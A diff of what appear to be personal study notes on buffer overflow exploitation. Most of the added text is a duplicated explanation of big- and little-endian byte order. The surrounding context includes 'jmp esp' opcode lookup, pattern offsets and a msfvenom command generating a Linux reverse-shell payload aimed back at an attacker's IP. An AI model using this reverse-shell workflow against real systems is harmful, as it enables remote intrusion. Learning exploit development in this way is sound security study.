@@ -120,7 +120,25 @@ nasm>jmp esp
 
 ```
 
+## data format
+load word or store word instruction uses only one memory address. The lowest address of the four bytes is used for the address of a block of four contiguous bytes.
 
+How is a 32-bit pattern held in the four bytes of memory? There are 32 bits in the four bytes and 32 bits in the pattern, but a choice has to be made about which byte of memory gets what part of the pattern. There are two ways that computers commonly do this:
+
+   ## Big Endian Byte Order: 
+   The most significant byte (the "big end") of the data is placed at the byte with the lowest address. The rest of the data is placed in order in the next three bytes in memory.
+
+
+   ## Little Endian Byte Order: The least significant byte (the "little end") of the data is placed at the byte with the lowest address. The rest of the data is placed in order in the next three bytes in memory.
+
+In these definitions, the data, a 32-bit pattern, is regarded as a 32-bit unsigned integer. The "most significant" byte is the one for the largest powers of two: 231, ..., 224. The "least significant" byte is the one for the smallest powers of two: 27, ..., 20.
+
+
+For example, say that the 32-bit pattern 0x12345678 is stored at address 0x00400000. The most significant byte is 0x12; the least significant is 0x78.
+
+Within a byte the order of the bits is the same for all computers (no matter how the bytes themselves are arranged).
+
+<img src="https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/bigLittleEndian.gif" style="zoom:50%;" />
 
 #### genrating shellcode
 
@@ -195,7 +213,7 @@ msf-pattern_offset -q string
 
 
 #### geting opcodes
-
+<img src="https://i.stack.imgur.com/qLiB4.png">
 ```
 msf-nasm_shell
 nasm>
@@ -224,15 +242,34 @@ nasmm>
 ```
 
 ```
+## nasm opcodes
+<img src="https://i.stack.imgur.com/qLiB4.png">
+
+## data format
+load word or store word instruction uses only one memory address. The lowest address of the four bytes is used for the address of a block of four contiguous bytes.
+
+How is a 32-bit pattern held in the four bytes of memory? There are 32 bits in the four bytes and 32 bits in the pattern, but a choice has to be made about which byte of memory gets what part of the pattern. There are two ways that computers commonly do this:
+
+   ## Big Endian Byte Order: 
+   The most significant byte (the "big end") of the data is placed at the byte with the lowest address. The rest of the data is placed in order in the next three bytes in memory.
 
 
+   ## Little Endian Byte Order: The least significant byte (the "little end") of the data is placed at the byte with the lowest address. The rest of the data is placed in order in the next three bytes in memory.
+
+In these definitions, the data, a 32-bit pattern, is regarded as a 32-bit unsigned integer. The "most significant" byte is the one for the largest powers of two: 231, ..., 224. The "least significant" byte is the one for the smallest powers of two: 27, ..., 20.
+
+
+For example, say that the 32-bit pattern 0x12345678 is stored at address 0x00400000. The most significant byte is 0x12; the least significant is 0x78.
+
+Within a byte the order of the bits is the same for all computers (no matter how the bytes themselves are arranged).
+
+<img src="https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/bigLittleEndian.gif" style="zoom:50%;" />
 
 ### genrating shellcode
 
 ```
 msfvenom -p linux/x86/shell_reverse_tcp lhost=ip of attacker lport=port to connect -b "badcharcters here" -f fileformat -o outputname
 ```
-
 
 
 ### modfying shellcode
